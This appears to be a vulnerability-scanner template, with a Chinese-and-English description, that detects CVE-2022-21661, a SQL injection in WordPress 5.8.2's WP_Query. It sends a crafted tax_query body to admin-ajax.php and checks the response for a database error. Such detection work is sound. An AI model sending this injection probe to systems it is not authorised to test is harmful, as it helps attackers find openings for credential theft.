id: CVE-2022-21661

info:
  name: WordPress Core 5.8.2 - 'WP_Query' SQL注入信息泄露漏洞
  author: Aryan Chehreghani
  severity: critical
  description: 此漏洞允许远程攻击者泄露有关受影响的WordPress核心安装的敏感信息，Authentication 不需要利用此漏洞，具体缺陷存在于 WP_Query 类中，该问题是由于在使用用户提供的字符串构建SQL查询之前没有对其进行适当的验证，An attacker 可以利用此漏洞来泄露存储的凭据，从而导致进一步的危害。
  reference:
    - https://wordpress.org/news/category/releases
    - https://www.zerodayinitiative.com/advisories/ZDI-22-020
    - https://hackerone.com/reports/1378209

set:
  rand: randomInt(200000000, 210000000)
rules:
  r0:
    request:
      method: POST
      path: /wp-admin/admin-ajax.php
      headers:
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: cross-site
        Sec-Fetch-User: ?1
        Cache-Control: max-age=0
      body: |
        action=<action_name>&nonce=a85a0c3bfa&query_vars={"tax_query":{"0":{"field":"term_taxonomy_id","terms":[""]}}}
    expression: response.status == 200  && response.body.bcontains(b'WordPress database error:')
expression: r0()